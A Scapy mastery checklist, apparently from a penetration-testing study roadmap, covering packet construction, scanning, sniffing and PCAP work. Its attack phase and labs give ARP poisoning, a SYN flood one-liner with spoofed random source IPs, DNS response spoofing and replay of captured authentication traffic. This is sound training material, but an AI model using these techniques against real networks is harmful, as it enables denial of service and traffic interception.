# 🐍 Scapy: Complete Mastery Checklist

> **What is Scapy?** Scapy is a Python library and interactive tool for creating, sending, capturing, and analyzing arbitrary network packets. You can construct any packet from scratch — specifying every header field at every protocol layer — or capture live traffic and manipulate it. It understands dozens of protocols natively and lets you forge, fuzz, decode, and replay packets at will.
>
> **Why does it exist?** Most network tools are purpose-built — Nmap scans, tcpdump captures, Wireshark analyzes. Scapy does all of this and more, but the key difference is programmability: you write Python to construct exact packets. This makes it invaluable for: creating custom protocol implementations, fuzzing network services, building novel attack tools, and understanding protocols at the bit level.
>
> **When to use it:** Custom packet crafting and protocol research. Fuzzing network services. Building custom scanners. ARP/ICMP manipulation. Implementing PoC exploits that require precise packet construction. Understanding exactly how a network protocol works.
>
> **When to use other tools:** For standard scanning/capturing: Nmap/tcpdump are faster and simpler. Scapy shines when you need custom packets that no other tool can produce.
>
> **What mastering Scapy unlocks:** Deep understanding of network protocols at the packet level. Ability to build any custom network tool in Python. Protocol fuzzing and research. Building PoC exploit tools. The ultimate network programming foundation.
>
> **Roadmap Phase:** Phase 2–3 (Scanning, Enumeration, and Network Protocol Research)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | Packet Construction | 5 | 3–4 hours |
| 3 | Sending and Receiving | 4 | 2–3 hours |
| 4 | Sniffing and Capture | 3 | 2–3 hours |
| 5 | Attack Techniques | 4 | 3–5 hours |
| 6 | Scripting | 3 | 2–3 hours |
| 7 | Practical Labs | 4 | 4–6 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **31** | **~21–32 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Installation and Interactive Mode

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Install** | `pip3 install scapy`. |
| **Interactive** | `sudo scapy` — opens Python REPL with all Scapy classes imported. |
| **Script** | `from scapy.all import *` — import in a Python script. |
| **Root** | Sending raw packets and sniffing require root. `sudo scapy`. |

---

### Task 1.2 — Layer Model in Scapy

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Layers** | Packets are built by stacking layers with `/`: `Ether()/IP()/TCP()/Raw(b"data")`. |
| **Each Layer** | A Scapy class with named fields: `IP(dst="8.8.8.8", ttl=64)`. `TCP(dport=80, flags="S")`. |
| **Inspect** | `pkt = IP()/TCP()`. `pkt.show()` — print all fields and values. `pkt.summary()` — one-line summary. |
| **Modify** | `pkt[IP].ttl = 128` — modify a field in a built packet. |

---

### Task 1.3 — Protocol Classes

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Ethernet** | `Ether(dst="ff:ff:ff:ff:ff:ff", src="aa:bb:cc:dd:ee:ff")`. |
| **IP** | `IP(src="1.2.3.4", dst="5.6.7.8", ttl=64, proto=6)`. |
| **TCP** | `TCP(sport=12345, dport=80, flags="S", seq=100, ack=0)`. |
| **UDP** | `UDP(sport=53, dport=53)`. |
| **ICMP** | `ICMP(type=8, code=0)` — echo request. |
| **ARP** | `ARP(op=1, pdst="192.168.1.1")` — ARP request. |
| **DNS** | `DNS(rd=1, qd=DNSQR(qname="example.com"))`. |

---

### Task 1.4 — Inspect Protocols

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **List Fields** | `ls(IP)` — list all IP header fields with types and defaults. `ls(TCP)` — TCP fields. |
| **Show** | `pkt.show()` — formatted view of all layers and fields. `pkt.show2()` — computed values (checksum filled in). |
| **Hexdump** | `hexdump(pkt)` — raw bytes. |
| **Decode** | `pkt = Ether(bytes_from_wire)` — decode raw bytes into Scapy packet. |

---

### Task 1.5 — Checksum Handling

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Auto** | Scapy computes checksums automatically before sending. Leave `chksum=None` (default). |
| **Manual** | `IP(chksum=0xdead)` — set manually (for fuzzing bad checksums). |
| **Verify** | `del pkt[IP].chksum; pkt = pkt.__class__(bytes(pkt))` — force recalculation. |

---

# PHASE 2: PACKET CONSTRUCTION

---

### Task 2.1 — Building a TCP SYN Packet

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Code** | `pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")`. |
| **Send** | `send(pkt)` — send at layer 3. `sendp(Ether()/pkt, iface="eth0")` — send at layer 2. |
| **Flags** | `"S"` = SYN. `"SA"` = SYN-ACK. `"A"` = ACK. `"F"` = FIN. `"R"` = RST. `"PA"` = PSH+ACK. Combine: `"SA"`. |

---

### Task 2.2 — ARP Packet Construction

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **ARP Request** | `pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1")`. |
| **ARP Reply (Spoofed)** | `pkt = Ether(dst="victim_mac")/ARP(op=2, psrc="gateway_ip", pdst="victim_ip", hwdst="victim_mac")`. |
| **Fields** | `op=1` = request. `op=2` = reply. `psrc` = source IP. `hwsrc` = source MAC. `pdst` = dest IP. `hwdst` = dest MAC. |

---

### Task 2.3 — DNS Query Packet

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Query** | `pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))`. |
| **Send+Recv** | `resp = sr1(pkt, timeout=2)`. `resp[DNS].an.rdata` — answer's IP. |

---

### Task 2.4 — ICMP Ping

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Ping** | `pkt = IP(dst="8.8.8.8")/ICMP()`. `resp = sr1(pkt)`. `resp.show()`. |
| **Sweep** | `ans, unans = sr(IP(dst="192.168.1.0/24")/ICMP(), timeout=2)`. `ans.summary()`. |

---

### Task 2.5 — Custom Payload

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Raw** | `pkt = IP(dst="target")/TCP(dport=9999)/Raw(b"GET / HTTP/1.0\r\n\r\n")`. |
| **HTTP** | Scapy has an HTTP layer: `from scapy.layers.http import *`. `pkt = IP(dst="target")/TCP(dport=80)/HTTP()/HTTPRequest(Method=b"GET", Path=b"/", Http_Version=b"HTTP/1.0")`. |

---

# PHASE 3: SENDING AND RECEIVING

---

### Task 3.1 — send vs. sendp vs. sr vs. sr1

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **send** | Layer 3 send (IP and above). OS handles routing. `send(IP(dst="target")/ICMP())`. |
| **sendp** | Layer 2 send (Ethernet and above). Full control including source MAC. `sendp(Ether()/IP(dst="target")/ICMP(), iface="eth0")`. |
| **sr** | Send and receive. Returns `(answered, unanswered)` pair. `ans, unans = sr(pkt, timeout=2)`. |
| **sr1** | Send and receive one response. Returns first response or `None` on timeout. `resp = sr1(pkt, timeout=2)`. |
| **srp** | Layer 2 send and receive. `ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2, iface="eth0")`. |

---

### Task 3.2 — ARP Host Discovery

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Code** | `ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2, iface="eth0", verbose=False)`. `for sent, received in ans: print(received.psrc, received.hwsrc)`. |
| **Result** | Lists all responding IPs and their MAC addresses. Faster than Nmap's ARP scan in a script. |

---

### Task 3.3 — TCP Port Scanner

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **SYN Scan** | `ports = [22, 80, 443, 8080]`. `ans, unans = sr(IP(dst="target")/TCP(dport=ports, flags="S"), timeout=2)`. `for sent, recv in ans: if recv.haslayer(TCP) and recv[TCP].flags == 0x12: print(f"Port {recv[TCP].sport}: OPEN")`. |
| **Flags** | `0x12` = SYN+ACK (open). `0x14` = RST+ACK (closed). No response = filtered. |

---

### Task 3.4 — Send Loops and Rate Control

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Loop** | `sendp(pkt, count=100)` — send 100 times. `sendp(pkt, loop=1, inter=0.5)` — loop forever, 0.5s between sends. Ctrl+C to stop. |
| **Inter** | `sr(pkt, inter=0.1)` — 100ms between each packet. |

---

# PHASE 4: SNIFFING AND CAPTURE

---

### Task 4.1 — Sniff

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Basic** | `pkts = sniff(count=100)` — capture 100 packets. `pkts.summary()`. |
| **Filter** | `sniff(filter="tcp port 80", count=50)` — BPF filter. |
| **Interface** | `sniff(iface="eth0", count=50)`. |
| **Callback** | `sniff(prn=lambda p: p.summary())` — call function on each captured packet. |
| **Timeout** | `sniff(timeout=10)` — stop after 10 seconds. |

---

### Task 4.2 — PCAP Files

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Write** | `pkts = sniff(count=100); wrpcap("capture.pcap", pkts)`. |
| **Read** | `pkts = rdpcap("capture.pcap")`. `pkts[0].show()`. |
| **Scapy + Wireshark** | `wireshark(pkts)` — open packets in Wireshark directly from Scapy. |

---

### Task 4.3 — Packet Analysis

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Filter by Protocol** | `http_pkts = [p for p in pkts if p.haslayer(TCP) and p[TCP].dport == 80]`. |
| **Extract Fields** | `for p in pkts: if p.haslayer(IP): print(p[IP].src, p[IP].dst)`. |
| **Extract Payload** | `p[Raw].load` — raw bytes of payload. `p[Raw].load.decode("utf-8", errors="ignore")` — try to decode. |

---

# PHASE 5: ATTACK TECHNIQUES

---

### Task 5.1 — ARP Poisoning with Scapy

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Spoof** | `import time`. `victim="192.168.1.100"; gateway="192.168.1.1"`. `victim_mac = getmacbyip(victim); gw_mac = getmacbyip(gateway)`. Loop: send `ARP(op=2, psrc=gateway, hwsrc=attacker_mac, pdst=victim, hwdst=victim_mac)` and `ARP(op=2, psrc=victim, hwsrc=attacker_mac, pdst=gateway, hwdst=gw_mac)` every 2 seconds. |
| **Restore** | On exit: send correct ARP replies to restore tables. |

---

### Task 5.2 — SYN Flood

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Code** | `from scapy.all import *; import random`. `send(IP(src=RandIP(), dst="target")/TCP(dport=80, flags="S", sport=RandShort()), loop=1, verbose=False)`. |
| **`RandIP()`** | Random source IP per packet. Defeats simple IP-based blocks. |
| **Lab Only** | SYN flood is a DoS attack. Only in isolated lab environments. |

---

### Task 5.3 — DNS Spoofing (Response Injection)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Sniff + Inject** | Sniff DNS queries from poisoned victim. When a query is seen: immediately send a forged DNS response with attacker's IP as the answer before the real response arrives. |
| **Code Skeleton** | `sniff(filter="udp port 53", prn=dns_spoof)`. In `dns_spoof`: check if `DNSQR in pkt` → build spoofed reply → send before real DNS server responds. |

---

### Task 5.4 — Fuzzing with Scapy

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Fuzz Layer** | `fuzz(IP()/TCP())` — Scapy fills random values in all unset fields. `send(fuzz(IP(dst="target")/TCP(dport=80)))`. |
| **Protocol Fuzzing** | Systematically fuzz a custom protocol: build valid packet → modify one field at a time with unexpected values → send → watch for crashes or unexpected behavior. |

---

# PHASE 6: SCRIPTING

---

### Task 6.1 — Building a Custom Scanner

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Goal** | Write a SYN scanner in Python using Scapy. Input: target IP and port list. Output: open ports. |
| **Key** | Use `sr()` with a list of `TCP(dport=port_list)` packets in one call (Scapy handles this efficiently). Match responses by port. |

---

### Task 6.2 — ARP Scanner Script

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Goal** | Write an ARP host discovery script. Input: CIDR range. Output: IP → MAC table of responding hosts. |
| **Use** | `srp()` with Ethernet broadcast + ARP request for the CIDR. Parse answers. |

---

### Task 6.3 — Packet Replay

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Replay** | `pkts = rdpcap("capture.pcap")`. `sendp(pkts, iface="eth0")`. Send captured packets back onto the network. |
| **Use** | Replay a legitimate authentication sequence. Test if a service is vulnerable to replay attacks. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — ARP Discovery and Network Mapping

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| **Scenario** | Write a Scapy script that discovers all active hosts on the local subnet using ARP. Output a formatted table: IP address → MAC address → OUI (manufacturer). |
| **Success Criteria** | Script discovers all hosts. OUI lookup working. |

---

### Lab 7.2 — Custom SYN Port Scanner

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Write a Scapy-based SYN scanner. Compare results to Nmap SYN scan on the same target. Results should match. |
| **Success Criteria** | Open ports match Nmap. RST/filtered correctly identified. Script under 30 lines of Python. |

---

### Lab 7.3 — ARP Poisoning Script

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| **Scenario** | Write a complete ARP poisoning script: resolve victim and gateway MACs, send spoofed ARPs in a loop, enable IP forwarding, restore ARP tables on Ctrl+C exit. |
| **Success Criteria** | MITM confirmed (victim's ARP table shows attacker's MAC for gateway). Traffic flows through attacker. Clean restore on exit. |

---

### Lab 7.4 — Protocol Fuzzer

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Write a Scapy fuzzer for a custom UDP protocol (specify your own). Send 1000 random payloads. Monitor target for crashes or unexpected behavior. Log which payloads caused issues. |
| **Success Criteria** | Fuzzer functional. 1000 payloads sent. Any crashes logged with the triggering payload. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Build a Network Tool from Scratch

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 120 min

| **Scenario** | Build a complete network tool that doesn't exist as a pre-built tool. Example: a targeted ICMP tunnel client/server, a custom protocol scanner, or a covert channel using IP header fields. |
| **Success Criteria** | Tool functional. Documented. Could be demonstrated in an interview. |

---

### Challenge 8.2 — CTF Network Challenge

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Find a CTF challenge requiring packet manipulation or custom packet crafting (PCAP forensics, packet injection, protocol reverse engineering). Solve it using Scapy. |
| **Success Criteria** | Flag captured. Solution implemented in Scapy Python script. |

---

### Challenge 8.3 — Implement CVE PoC

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Find a network-based CVE with a packet-level PoC (e.g., fragmentation attack, TCP sequence prediction, malformed packet crash). Implement the PoC using Scapy. Test in a lab. |
| **Success Criteria** | CVE PoC functional in lab. Implemented in Scapy. Full explanation of the vulnerability written. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can construct custom packets at any protocol layer | ☐ |
| Can send layer 2 and layer 3 packets | ☐ |
| Can use sr/sr1 to send packets and receive responses | ☐ |
| Can build a complete ARP host discovery tool | ☐ |
| Can build a SYN port scanner in Scapy | ☐ |
| Can perform ARP poisoning via Scapy script | ☐ |
| Can sniff traffic and extract fields programmatically | ☐ |
| Can read/write PCAP files | ☐ |
| Can use Scapy's fuzz() for protocol fuzzing | ☐ |
| Can build any custom network tool in Python with Scapy | ☐ |

---

## 🎯 Interview Questions

1. What is Scapy and what makes it different from tools like Nmap or tcpdump?
2. How do you build a TCP SYN packet in Scapy and send it?
3. What is the difference between `send`, `sendp`, `sr`, and `sr1`?
4. How do you build an ARP discovery scanner with Scapy?
5. How do you implement ARP poisoning from scratch in Scapy?
6. How does Scapy's `fuzz()` work?
7. How do you sniff packets in Scapy and filter for a specific protocol?
8. How do you read a PCAP file and extract specific fields using Scapy?
